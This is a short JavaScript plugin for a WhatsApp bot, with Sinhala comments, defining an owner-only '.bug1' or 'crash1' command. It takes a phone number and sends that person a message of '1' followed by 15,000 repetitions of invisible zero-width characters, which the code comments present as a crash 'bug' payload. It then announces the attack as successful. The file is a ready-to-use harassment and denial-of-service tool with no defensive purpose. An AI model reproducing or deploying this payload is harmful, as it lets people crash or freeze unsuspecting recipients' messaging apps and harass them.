const { cmd } = require('../command');

cmd({
    pattern: "bug1",
    alias: ["crash1", "1bug"],
    desc: "WhatsApp 1-Invi Bug (High Power)",
    category: "owner",
    use: '.bug1 <number>',
    filename: __filename
},
async(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {
        // ආරක්ෂාව සඳහා: බොට්ගේ අයිතිකරුට පමණක් මෙම කමාන්ඩ් එක ක්‍රියාත්මක වේ.
        if (!isOwner) return reply("මෙය පාවිච්චි කළ හැක්කේ DEXTER ට පමණි. 🚫");

        // බග් එක යැවිය යුතු පුද්ගලයාගේ අංකය ඇතුළත් කර ඇත්දැයි බැලීම
        if (!q) return reply("කරුණාකර බග් එක යැවිය යුතු අංකය ලබා දෙන්න. \n\nඋදා: .bug1 947xxxxxxxx");

        let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

        // --- THE 1-BUG PAYLOAD ---
        // මෙහි පියවි ඇසට නොපෙනෙන අතිවිශාල දත්ත ප්‍රමාණයක් (15,000 repeats) අඩංගු වේ.
        const invisiblePayload = "1" + "\u200B\u200C\u200D\u200E\u200F".repeat(15000); 

        // ඉලක්කගත පුද්ගලයාට බග් එක යැවීම
        await conn.sendMessage(target, { text: invisiblePayload });

        // යැවූ බව තහවුරු කිරීමේ පණිවිඩය
        reply(`🚀 ප්‍රහාරය සාර්ථකයි! \n🎯 Target: ${q} \n⚡ Status: Delivered via Bug-System`);

    } catch (e) {
        console.log(e);
        reply("දෝෂයක් ඇති විය: " + e.message);
    }
});
